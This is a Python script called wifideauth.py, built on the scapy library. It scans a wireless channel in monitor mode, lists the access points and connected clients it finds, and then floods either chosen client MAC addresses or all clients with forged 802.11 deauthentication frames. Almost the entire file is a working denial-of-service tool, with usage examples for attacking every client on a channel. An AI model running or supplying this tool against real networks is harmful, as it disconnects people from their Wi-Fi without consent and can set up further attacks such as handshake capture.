import os,  re, sys,  getopt, subprocess, logging
from scapy.all import *
from mac_vendor_lookup import MacLookup

# global variables
maclookup= None
int_monitor= None
Channel = None
Verbose = False
sniff_mode ='Scan'
Attack= False

access_points = []
client = []
def initialize():
	global  maclookup


	parse_args()

       #Logging function
	logging.basicConfig(
		level= logging.DEBUG if Verbose else logging.INFO,
		format='[%(levelname)s] %(message)s'
	)
       #INitialize MAC lookup
	maclookup = MacLookup()
	maclookup.load_vendors()

def parse_args():
        global Attack, sniff_mode , Verbose , Channel

        try:
                opts, args = getopt.getopt(sys.argv[1:], 'hvc:a:', ['help', 'verbose', 'channel=', 'attack='])
        except getopt.GetoptError as err:
                print(err)
                print_usage()
                sys.exit(2)

        for o, a in opts:
               #Print help message to show user how to run the script
                if o == '-h' or o == '--help':
                        print_usage()
                        sys.exit()
               #Print more info
                elif o in ('-v', '--verbose'):
                        Verbose = True
               #Allows user to set channel to scan and  attack
                elif o in ('-c', '--channel'):
                        Channel = int(a)
                        if not (1 <=  Channel and Channel <= 14):
                                Channel = None
               #Attack a MAC Address
                elif o in ('-a'):
                        if a.lower() == '*':
                                Attack = True
                        elif validate_mac_addr(a):
                                client.append(a)
                                sniff_mode = 'attack'
                        else:
                                assert False, "Invaild MAC address"
                else:
                        assert False, "Unhandled option"


def print_usage():
	print(
		'Run this script this way: sudo python wifideauth.py\n'
		'\n'
		'Arguments can be used for\n'
		'  -v                         Run in verbose mode\n'
		'  -h, --help                 Prints Options\n'
		'  -c, --channel              The channel that is currently being monitored\n'
		'  -a, --attack               The client MAC addr to attack\n'
		'\n'
		'Example\n'
		'  Monitoring channel\n'
		'  sudo python wifideauth.py -c 8\n'
		'  Attack all clients on a particular channel\n'
		'  sudo python wifideauth.py -c 8 -a *\n'
		'  Attacking clients based on MAC address on a particular channel\n'
		'  sudo python wifideauth.py -c 8 -a 2C:D0:66:A3:6E:39\n'
		'\n'
	)


def throwing_error(error):
	if error:
		logging.critical(error)
	logging.critical('Cannot scan interfaces')
	sys.exit(1)

def run_cmd(cmd):
	if isinstance(cmd, str):
		return subprocess.run(cmd, shell=True, check=False, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
	else:
		return subprocess.run(cmd, check=False, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

def run_assert(cmd, error):
	logging.debug(cmd)
	result_run = run_cmd(cmd)
	if result_run.returncode != 0:
		 throwing_error(error)
	return result_run

def yes_and_no(qn, default_ans ="yes"):

	valid_ans = {"yes": True, "y": True, "ye": True, "no": False, "n": False}
	if default_ans == "yes":
		prompt = " [Y/n] "
	elif default_ans == "no":
		prompt = " [y/N] "
	elif default_ans is None:
		prompt = " [y/n] "
	else:
		raise ValueError("invalid default answer: '%s'" % default_ans)

	while True:
		sys.stdout.write(qn + prompt)
		choice = input().lower()
		if default_ans is not None and choice == '':
			return valid_ans[default]
		elif choice in valid_ans:
			return valid_ans[choice]
		else:
			sys.stdout.write("Please respond with 'yes' or 'no' (or 'y' or 'n').\n")

def query_number(qn, number_from, number_to, default_ans=-1):
	if default_ans < number_from and number_to < default_ans:
		raise ValueError("invalid default answer: '%s'" % str(default_ans))
	prompt = " [" + str(number_from) + "-" + str(number_to) + ":" + str(default_ans) + "] "

	while True:
		sys.stdout.write(qn + prompt)
		choice = input()
		if default_ans is not None and choice == '':
			return default_ans
		choice = int(choice)
		if choice and choice >= number_from and choice <= number_to:
			return choice
		else:
			sys.stdout.write("Please choose a number between " + str(number_from) + "and" + str(number_to) + ".\n")
#Display MAC addresses and Vendors
def display_mac(mac):
	if mac is None:
		return '(None)'
	try:
		vendor = maclookup.lookup(mac)
	except KeyError as e:
		vendor = 'Unknown'
	return mac + ' (' + vendor + ')'

#Validate MAC Address
def validate_mac_addr(value):
	if re.match(r"^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$", value):
		return True
	return False

def get_int():
        #Get all the wireless interface
	result_run = run_assert('iwconfig', 'Cannot get wireless interfaces')

	result_run = re.sub(r"\n\s+\n", "\n\n", result_run.stdout.decode('utf-8'))
	data = re.findall(r"(([a-zA-Z0-9]+)\s+(?:.+\n)+)", result_run)

	ints = []
	for interface in data:
		if re.search(r"\s+Mode:Monitor\s+", interface[0]) :
			ints.append(interface[1])
	return ints

def select_int():

	ints = get_int()

	if (len(ints) == 0) :
		throwing_error('No interface');

	if (len(ints) > 1) :
		logging.info('Selecting the first interface')

	logging.info('Interface "%s" selected' % ints[0])
	return ints[0]
#Setting channel
def set_channel(interface, channel):
       #Changing channel
	result = run_cmd('iwconfig %s channel %d' % (interface, channel))
	if result.returncode != 0:
		logging.error('Cannot set channel %d on interface "%s"' % (channel, interface))
                #Reset interfaace
		if yes_and_no('Do you want to reset the interface "%s"?' % interface, 'yes'):

			run_assert(
				'ifconfig %s down && ifconfig %s up' % (interface, interface),
				'Failed to reset interface "%s"' % interface
			)

			run_assert(
				'iwconfig %s channel %d' % (interface, channel),
				'Cannot set channel  %d on interface "%s"' % (channel, interface)
			)
		else:
			throwing_error('Cancel')

	logging.info('Channel was set to %d' % channel)


#Scan for devices
def sniff_handler(pkt):
        # Getting layer information
	layer = pkt.getlayer(Dot11)
        #Detecting an Access Point
	if pkt.haslayer(Dot11Beacon) and layer.addr2 not in access_points:
		access_points.append(layer.addr2)
		logging.info('Access Point detected  : "%s" - %s' % (pkt.getlayer(Dot11Elt).info.decode('UTF-8'), display_mac(layer.addr2)))
       #Get the victims that are connected to the access point
	elif layer.addr2 is not None and layer.addr2 not in client and layer.addr1 in access_points:
		client.append(layer.addr2)
		logging.info('Client Mac Addr Detected : %s' % (display_mac(layer.addr2)))
#Attack the client connected to the access points
counter = 0
def sniff_attack(pkt):
	global counter

	layer = pkt.getlayer(Dot11)

	if pkt.haslayer(Dot11Beacon) and layer.addr2 not in access_points:
		access_points.append(layer.addr2)
		logging.info('Access Point Detected : "%s" - %s' % (pkt.getlayer(Dot11Elt).info.decode('UTF-8'), display_mac(layer.addr2)))

       #Send deauthentication packets to the client
	elif ((Attack == True and layer.addr2 is not None) or layer.addr2 in client) and layer.addr1 in access_points:
		counter= counter + 1
		logging.info('Deauthentication Packet Number[%d]: %s' % (counter, display_mac(layer.addr2)))
		inject = RadioTap()/Dot11(addr1=layer.addr2,addr2=layer.addr1,addr3=layer.addr1)/Dot11Deauth(reason=7)
		sendp(inject, iface=int_monitor, count=10, verbose=False)


if __name__ == "__main__":

        #Initialize script
        initialize()
        #Get an interface
        int_monitor = select_int()
        #Setting channel
        if Channel is None:
                Channel =query_number('Choose the channel to monitor', 1,14, default_ans =1)
        set_channel(int_monitor, Channel)
        #MOnitor the interface
        handler = \
                sniff_attack if sniff_mode == 'attack' else\
                sniff_handler
        sniff(iface=int_monitor, prn=handler)
